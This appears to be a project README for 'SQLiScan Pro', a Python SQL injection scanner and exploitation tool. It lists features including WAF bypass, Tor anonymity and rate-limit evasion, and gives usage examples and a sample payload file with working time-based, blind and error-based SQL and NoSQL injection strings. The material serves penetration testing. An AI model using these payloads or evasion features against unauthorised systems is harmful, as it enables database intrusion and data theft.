# 🛡️ SQLiScan Pro

SQLiScan Pro is an advanced, asynchronous, and highly efficient SQL Injection vulnerability scanner and exploitation tool developed in Python. Designed for security professionals, penetration testers, and developers, it automates the process of detecting various types of SQL Injection flaws in web applications and, where possible, facilitates data extraction.

Leveraging asynchronous programming, sophisticated payload management, and comprehensive detection techniques, SQLiScan Pro provides robust and reliable vulnerability assessment.

---

## 🚀 Features

- **🧠 Comprehensive SQLi Detection:** Detects a wide range of vulnerabilities:
  - Error-Based SQLi
  - Blind SQLi (Content-Based, Length-Based)
  - Time-Based SQLi
  - UNION-Based SQLi
  - Basic NoSQL Injection (MongoDB, etc.)

- **🔍 DBMS Fingerprinting:** Detects backend DBMS like MySQL, MSSQL, Oracle, PostgreSQL, SQLite, MongoDB.

- **💥 Automated Exploitation (UNION-Based):**
  - DBMS version
  - Current user/database
  - Table & column names
  - Example user data

- **🛡️ WAF Bypass Techniques:**
  - Obfuscation (comments, newlines)
  - Encoding (URL, Hex, Char)
  - Case permutation

- **⚡ Async & Concurrent Scanning:** Uses `asyncio` + `aiohttp` for high performance.

- **🕵️ Tor Integration:** Optional Tor proxy support for anonymity.

- **🧠 Brute-force Protection Bypass:** Random delays to evade rate-limiting.

- **🔐 CSRF Token Management:** Auto handles dynamic tokens in POST forms.

- **🔁 Robust Error Handling:** Retries on network failures.

- **🔧 Custom Payload Support:** JSON-based extendable payload system.

- **📊 Detailed Reporting:** Outputs reports in HTML, JSON, and TXT formats.

- **🧩 Modular Architecture:** Easily extendable classes: `RequestHandler`, `PayloadManager`, etc.

- **📈 Improved Logging:** Verbose, colorful CLI logs.

---

## 📦 Prerequisites

- **Python:** 3.7+
- **Install Libraries:**

```bash
pip install aiohttp requests socks pdfkit jinja2 tqdm
```

- **Install `wkhtmltopdf`:**

```bash
# Linux (Debian/Ubuntu)
sudo apt-get install wkhtmltopdf

# Windows
# Download from https://wkhtmltopdf.org and add to PATH
```

- **(Optional) Tor Proxy:** Tor should be running on `127.0.0.1:9050`

---

## 🧰 Installation

```bash
git clone https://github.com/your-username/SQLiScan-Pro.git
cd SQLiScan-Pro
pip install -r requirements.txt
```

---

## 🧪 Usage

```bash
python lastsqload.py --help
```

### 📌 Example Usage

```bash
# Basic GET scan
python lastsqload.py -u "http://example.com/search.php?query=test"

# POST scan
python lastsqload.py -u "http://example.com/login.php" -m POST -d "username=admin&password=pass"

# With Tor & custom payloads
python lastsqload.py -u "http://example.com/product.php?id=1" -t -p my_payloads.json"

# Verbose with concurrency and headers
python lastsqload.py -u "http://example.com" -w 20 -v -H '{"User-Agent": "MyScanner", "X-Forwarded-For": "1.1.1.1"}'
```

---

## 🛠️ Configuration File (JSON)

```json
{
  "target_url": "http://example.com/api/products?id=1",
  "request_method": "GET",
  "post_data": null,
  "tor_enabled": true,
  "max_concurrency": 15,
  "payload_file": "custom_payloads.json",
  "scan_timeout": 600,
  "blind_sqli_delay": 7.0,
  "verbose": true,
  "headers": {
    "Authorization": "Bearer your_token_here",
    "Cookie": "PHPSESSID=your_session_id"
  }
}
```

```bash
python lastsqload.py -c config.json
```

---

## 💣 Payload System

Custom payloads via `payloads.json`:

```json
{
  "time_based": {
    "generic": ["' AND SLEEP(5)-- -"],
    "mysql": ["' AND SLEEP(5)#"],
    "nosql": [{"$where": "sleep(5000)"}]
  },
  "blind": {
    "generic": ["' AND '1'='1", "' AND '1'='2'"],
    "nosql": [{"$ne": 1}, {"$eq": 1}]
  },
  "error_based": {
    "mysql": ["' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x717a78,(SELECT USER()),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -"],
    "generic": ["' OR 1=CAST((SELECT 1) AS INT)/0 --"]
  }
}
```

Supports modular extension via `payload_plugins/` folder.

---

## 📑 Reporting

Upon scan completion, detailed reports are generated:

- `HTML` (User-friendly format + PDF if wkhtmltopdf exists)
- `JSON` (Machine-readable)
- `TXT` (Plain summary)

Contents include:

- Target info
- Vulnerability types & payloads used
- Extracted data (if possible)
- Remediation tips

---
